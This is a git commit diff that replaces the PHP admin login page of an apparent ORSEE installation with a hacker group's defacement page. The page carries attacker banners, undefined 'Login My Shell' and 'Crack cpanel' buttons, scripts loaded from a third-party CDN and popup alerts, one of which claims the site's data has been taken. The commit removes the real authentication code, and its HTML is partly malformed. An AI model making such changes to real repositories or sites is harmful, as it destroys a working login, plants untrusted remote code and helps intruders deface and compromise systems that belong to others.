b92b3b9ed3e7e5c949aac4a6aafb68f8a4acfe5c
Napda007 <72958467+Napda007@users.noreply.github.com>
2020-11-18 23:24:51 +0700

    Update admin_login.php
    It's not time

--- admin/admin_login.php
+++ admin/admin_login.php
@@ -1,46 +1,186 @@
-<?php
-// part of orsee. see orsee.org
-ob_start();
-
-$title="admin_login_page";
-include("header.php");
-if ($proceed) {
-
-    echo '<center>';
-
-    if (isset($_REQUEST['logout']) && $_REQUEST['logout']) message(lang('logout'));
-
-    if (isset($_REQUEST['pw']) && $_REQUEST['pw']) {
-        message(lang('logout'));
-        message (lang('password_changed_log_in_again'));
+<html>
+<head>
+<title>Touched By mystic_135 </title>
+	<meta name='theme-color' content='black'/>
+	<meta name="author" content=" AFK"/>
+	<meta name="copyright" content="2k20"/>
+	<meta property="og:description" content=" NO THX "/>	
+	<meta property="og:image" content="https://i.top4top.io/p_1717h3py30.jpg"/>
+    <link rel="og:shortcut icon" href="https://i.top4top.io/p_1717h3py30.jpg"/>
+    <link href="https://fonts.googleapis.com/css2?family=Kalam&display=swap" rel="stylesheet" type="text/css">
+	<table width=100% height=100%>
+	<td align="center">
+<style>
+	h1 {
+            background: black;
+            color: white;
+            font-family: "Courier New";
+            text-align: center;      
+            text-shadow :0 0 5px #fff, 0 0 10px #fff, 0 0 20px #00ffed, 0 0 30px #00ffed, 0 0 40px #00ffed, 0 0 55px #00ffed, 0 0 75px #00ffed; 
+            opacity: 250%;
+       }
+     img { 
+            border-radius: 50%;
+            opacity: 50%;,
+        } 
+</style>
+<style type=text/css >
+    .blink_text {
+    -webkit-animation-name: blinker;
+    -webkit-animation-duration: 2s;
+    -webkit-animation-timing-function: linear;
+    -webkit-animation-iteration-count: infinite;
+    
+    -moz-animation-name: blinker;
+    -moz-animation-duration: 2s;
+    -moz-animation-timing-function: linear;
+    -moz-animation-iteration-count: infinite;
+    
+     animation-name: blinker;
+     animation-duration: 2s;
+     animation-timing-function: linear;
+     animation-iteration-count: infinite;
+    
+     color: white;
     }
-
-    show_message();
-
-    if (isset($_REQUEST['adminname']) && isset($_REQUEST['password'])) {
-        $logged_in=admin__check_login($_REQUEST['adminname'],$_REQUEST['password']);
-        if ($logged_in) {
-            $expadmindata['admin_id']=$_SESSION['expadmindata']['admin_id'];
-            log__admin("login");
-            if (isset($_REQUEST['requested_url']) && $_REQUEST['requested_url']) redirect(urldecode($_REQUEST['requested_url']));
-            else redirect("admin/index.php");
-        } else {
-            message(lang('error_password_or_username'));
-            $add="";
-            if (isset($_REQUEST['requested_url']) && $_REQUEST['requested_url'])
-                $add="?requested_url=".$_REQUEST['requested_url'];
-            redirect("admin/admin_login.php".$add);
-        }
-        $proceed=false;
+    @-moz-keyframes blinker { 
+     0% { opacity: 5.0;
+     }
+     50% { opacity: 0.0;
+     }
+     100% { opacity: 5.0;
+     }
+     }
+    @-webkit-keyframes blinker { 
+     0% { opacity: 5.0;
+     }
+     50% { opacity: 0.0;
+     }
+     100% { opacity: 5.0;
+     }
+     }
+    @keyframes blinker { 
+     0% { opacity: 5.0;
+     }
+     50% { opacity: 0.0;
+     }
+     100% { opacity: 5.0;
+     }
+     }
+     
+     #copy {
+         color: lime;
+         font-weight: bold;
+         font-family: Kelly Slab;
+     }
+     #copy a {
+         color: white;
+     }
+     #copy a:hover {
+         color: blue;
+     }
+    
+    body{
+    font-family: Kelly Slab;
+    background-color: black;
+    color:white;
     }
-}
-
-if ($proceed) {
-
-    admin__login_form();
-
-    echo '</center>';
-}
-include("footer.php");
-
-?>
+    #content tr:hover{
+    background-color: blue;
+    text-shadow:0px 0px 10px #fff;
+    }
+    #content .first{
+    background-color: #15CFF4;
+    }
+    table{
+    border: 1px #000000;
+    }
+    .s_tb{
+    border:1px silver;
+    }
+    a{
+    color:white;
+    font-size: 19px;
+    text-decoration:none;
+    }
+    a:hover{
+    color:green;
+    text-shadow:0px 0px 10px #ffffff;
+    }
+    input,select,textarea{
+    border: 2px #000000 solid;
+    -moz-border-radius: 5px;
+    -webkit-border-radius:5px;
+    border-radius:5px;
+    }
+    h2{
+    font-family:Kelly Slab;
+    font-size:25px;
+    color:white;
+    }
+    h3{
+    font-size:35px;
+    }
+    h4{
+    font-size:15px;
+    font-family:Kelly Slab;
+    color:white;
+    }
+    </style>
+    <style type="text/css">
+        .lagu{
+             background:transparent;
+            border:2px solid silver;
+            font-family:Share Tech Mono;
+            color:white;
+            font-size:18x;
+            font-weight:bold;
+            padding:3px 29px;
+            text-decoration:none;
+            text-shadow:0px 0px 20px #15CFF4;;
+          }
+        </style>
+        <script> function play(){ var audio = document.getElementById('lagu'); audio.play(); } function liat(){ document.getElementById('galiat').style.visibility='visible'; } 
+        </script>
+    <script type="text/javascript" src="https://cdn.rawgit.com/FicriPebriyana/efek/0a935a6c/efek%20salju.js"></script>
+    <script type="text/javascript" src="https://cdn.rawgit.com/FicriPebriyana/efek/0a935a6c/efek%20salju.js"></script>
+    <script type="text/javascript" src="https://cdn.rawgit.com/FicriPebriyana/efek/0a935a6c/efek%20salju.js"></script>   
+</head>
+<body bgcolor="black">
+    <center>
+        
+        <h1><p class="blink_text" style="font-size: 45px;font-family:Kalam;">Touched By @mystic_135  </font><br> orang yang suka di remehkan dan di sia siakan :)</p>
+            <img style="border:10px solid #0404B4;" src="https://i.top4top.io/p_1717h3py30.jpg"/>
+            <br></p></h1>
+        <H1><p class="blink_text" style="font-size: 45px;font-family:Kalam;"> lumayan buat push mirror wkwk hacker koq pansos hh lawak lo  </font> sine !</p>
+            <button class="lagu" onclick="play();liat();"><font face="Kalam" size="5" color="white" >Indonesia cyber Muslim X Muslim Cyber Army >
+            <p class="blink_text" style="font-size:18px;color: white;text-shadow: 10px 10px 20px #00ffff font-family:Iceland;">Contact me?</font><br><a href= AFK  i found your contact'> <img alt='WhatsApp' src='https://www.freepngimg.com/thumb/whatsapp/77193-zubees-icons-foods-computer-halal-logo-whatsapp.png ' width='31' height='32'></a>  <a href='https://youtu.be/xMssx3c6-oE'> <img alt='Youtube' src='http://assets.stickpng.com/images/580b57fcd9996e24bc43c545.png' width='34' height='31'></a> </footer></div><br>
+            </strong><br><strong>
+            <button class="lagu" onclick="play();liat();"><font face="Teko" size="5" color="white" >PLAY MUSIC NYA EA	</font></button><audio id="lagu" src="https://h.top4top.io/m_1717fqw800.mp3"></audio><br>
+            <button class="iqbal_table" onclick="mini()">Login My Shell</button> 
+            <button  class="iqbal_table" onclick="hapus()">Track me</button>
+            <button class="iqbal_table" onclick="cpanel()">Crack cpanel</button> 
+            <button class="iqbal_table" onclick="logcpanel()">login cpanel</button> 
+            <br><br><! -- thank all my Member -->
+            <button class="lagu" style=" font-family:Kalam; text-shadow :0 0 5px #fff, 0 0 0px #fff, 0 0 0px #00ffed, 0 0 0px #00ffed, 0 0 12px #00ffed, 0 0 0px #00ffed, 0 0 0px #00ffed;"><marquee width="700"  <font color="white" > MCA - ECM - OFC - AFK </marquee></h1>
+</button>            
+<h1><p class="blink_text" style="font-size: 15px;font-family:Kalam;">Thanks:My AFK member.Muslim Cyber Army.Elite Cyber Army.Defacer Experimental Definisiont</font><br></p>
+                </html>
+                <script>alert(' ^AFK Cyber hat In Here');</script>
+                <script>alert('KAMI ADA DAN KAMI NYATA');</script>
+                <script>alert(' SORRY SEBELUMNYA SKSK');</script>
+				<script>alert(' Anda Jomblo?? ');</script>
+				<script>alert(' Yahahaha kasian :v ');</script>
+				<script>alert('Dah diem NJIR' );</script>
+				<script>alert(' gw GoodBoy coeq ');</script>
+				<script>alert('season 2 no game no life kapan!!!! ');</script>
+                <script>alert('yang tetep Main Game Online anda hebat');</script>
+                <script>alert(' Sorry gw udh gk maen, sekali main bikin rusuh jadi cheater:v ');</script>
+				<script>alert(' bukan no skill, rasanya anjim banget ');</script>
+				<script>alert(' i will nge flyy ');</script>
+				<script>alert(' 404' );</script>
+				<script>alert(' 503 error? biasa sksk ');</script>
+				<script>alert(' Elerning nge bug cuy, mau tau?:v ');</script>
+				<script>alert(' awas kamera hati hati kena sadap sksk :) ');</script
+				<script>alert(' makasiih datanya udah selesai di ambil sksk...');</script>
+meta name='theme-color' content='black'/>
